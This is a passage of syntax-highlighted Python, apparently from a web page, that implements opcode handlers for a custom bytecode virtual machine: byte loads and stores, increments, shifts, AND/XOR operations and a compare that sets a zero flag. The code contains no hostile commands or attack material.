</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise IndexError(&#34;reg out of range in 0x1A&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>+</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;LDB R{dst} = [base0 + (u16)R{src}] @0x{addr:04x} =&gt; 0x{val:02x}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1B: byte[mem[base0 + (u16)R[src]]] = (u8)R[dst]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1B</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise IndexError(&#34;reg out of range in 0x1B&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>+</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=n>u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u8</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span> <span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;STB [base0 + (u16)R{src}] @0x{addr:04x} = R{dst}.lo (0x{val:02x})&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1C: R[reg]++ ; ZF = (old == -1)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1C</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise IndexError(&#34;reg out of range in 0x1C&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>old</span> <span class=o>==</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;INC R{reg}: 0x{old:016x} -&gt; 0x{self.regs[reg]:016x}, ZF={self.zf}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1D: R[reg]-- ; ZF = (old == 1)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1D</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise IndexError(&#34;reg out of range in 0x1D&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>old</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;DEC R{reg}: 0x{old:016x} -&gt; 0x{self.regs[reg]:016x}, ZF={self.zf}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1E: R[reg] &gt;&gt;= shift8 ; ZF = (result == 0)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1E</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>shift</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x1E&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=n>shift</span> <span class=o>&amp;</span> <span class=mh>0x3F</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>res</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;SHR R{reg} &gt;&gt;= {shift &amp; 0x3F}: 0x{val:016x} -&gt; 0x{res:016x}, ZF={self.zf}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1F: base0 += (u16)R[reg]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1F</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x1F&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>base0</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>+</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;ADD base0 += (u16)R{reg}: 0x{old:04x} -&gt; 0x{self.base0:04x}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x25: AND 寄存器</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x25</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x25&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>&amp;</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;AND R</span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2> &amp;= R</span><span class=si>{</span><span class=n>src</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> &amp; 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> = 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x26: XOR 寄存器</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x26</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x26&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>^</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>==</span> <span class=n>old</span><span class=p>)</span>  <span class=c1># 等价于 src == 0</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;XOR R</span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2> ^= R</span><span class=si>{</span><span class=n>src</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> ^ 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> = 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x27: R[reg] &lt;&lt;= shift8 ; ZF = (result == 0)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x27</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>shift</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x27&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>val</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=n>shift</span> <span class=o>&amp;</span> <span class=mh>0x3F</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>res</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;SHL R{reg} &lt;&lt;= {shift &amp; 0x3F}: 0x{val:016x} -&gt; 0x{res:016x}, ZF={self.zf}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x29: R[reg] ^= imm64 ; ZF = (old == imm)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x29</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x29&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>:</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                      <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>^</span> <span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>old</span> <span class=o>==</span> <span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;XOR R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> ^= imm64 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> -&gt; 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x2A: R[reg] &amp;= imm64 ; ZF = (result == 0)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x2A</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x2A&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>:</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                      <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>&amp;</span> <span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;AND R{reg} &amp;= imm64 0x{imm:016x}: 0x{old:016x} -&gt; 0x{self.regs[reg]:016x}, ZF={self.zf}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x2B: R[dst] = byte[mem[base1 + (u16)R[src]]]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x2B</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base1</span> <span class=o>+</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;LDB R{dst} = [base1 + (u16)R{src}] @0x{addr:04x} =&gt; 0x{val:02x}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x2C: byte[mem[base1 + (u16)R[src]]] = (u8)R[dst]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x2C</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x2C&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base1</span> <span class=o>+</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=n>u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u8</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span> <span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;STB [base1 + (u16)R{src}] @0x{addr:04x} = R{dst}.lo (0x{val:02x})&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x32: ZF = (R[reg] == imm64)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x32&#34;)</span>
